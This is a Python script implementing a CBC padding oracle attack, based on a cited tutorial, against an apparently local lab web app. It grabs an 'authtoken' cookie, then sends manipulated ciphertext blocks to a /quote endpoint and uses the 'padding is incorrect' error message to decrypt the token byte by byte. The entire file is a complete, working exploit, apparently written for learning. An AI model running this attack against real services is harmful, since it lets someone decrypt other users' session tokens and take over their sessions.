import requests
import secrets

basepath = 'http://localhost:5000'
quotepath = basepath + '/quote'

#Based on https://robertheaton.com/2013/07/29/padding-oracle-attack/

def extractTokenFrom(response):
 tokenHeader = response.cookies.get('authtoken')
 return tokenHeader

def askPaddingOracle(ciphertext):
 cookies = {'authtoken': ciphertext.hex()}
 response = requests.get(quotepath, cookies = cookies)
 return response

#Decrypts a block of 16 bytes
def decryptBlock(previousBlock, blockToDecrypt):
 intermediateStateBytes = bytearray(16)
 decryptedPlainText = bytearray(16)
    
 for byteindex in range(15, -1, -1):
  paddingvalue = 16 - byteindex
  sneakyPreviousBlock = bytearray(16)
     
  for index in range(15, byteindex, -1):
   sneakyPreviousBlock[index] = paddingvalue ^ intermediateStateBytes[index]
     
  for value in range(0,256):
   sneakyPreviousBlock[byteindex] = value
   blockToSend = sneakyPreviousBlock + blockToDecrypt
   
   response = askPaddingOracle(blockToSend)
   
   if 'padding is incorrect' not in response.text.lower():
    previousBlockValue = previousBlock[byteindex]
    intermediateByteValue = value ^ paddingvalue
    intermediateStateBytes[byteindex] = intermediateByteValue
    plaintextByte = previousBlockValue ^ intermediateByteValue
    decryptedPlainText[byteindex] = plaintextByte
    print('Decrypted byte, the current block is now: ' + str(decryptedPlainText.decode().upper()))
    break
   else:
    continue
 
 print('Block is decrypted to be - ' + decryptedPlainText.decode().upper())
 return decryptedPlainText

#Assumes the ciphertext is 4 blocks of 16 bytes, could be made more generic
def runPOAttack(ciphertext):
 cipherbytes = (bytes.fromhex(ciphertext))
 
 cipherblock1 = bytearray(cipherbytes[0:16])
 cipherblock2 = bytearray(cipherbytes[16:32])
 cipherblock3 = bytearray(cipherbytes[32:48])
 cipherblock4 = bytearray(cipherbytes[48:])
    
 block4 = decryptBlock(cipherblock3, cipherblock4)
 block3 = decryptBlock(cipherblock2, cipherblock3)
 block2 = decryptBlock(cipherblock1, cipherblock2)
    
 print('Successfully decrypted full ciphertext to be - ' + (block2 + block3 + block4).decode().upper())

def main():
 ciphertext = extractTokenFrom(requests.get(basepath))
 runPOAttack(ciphertext)


if __name__ == "__main__":
 main()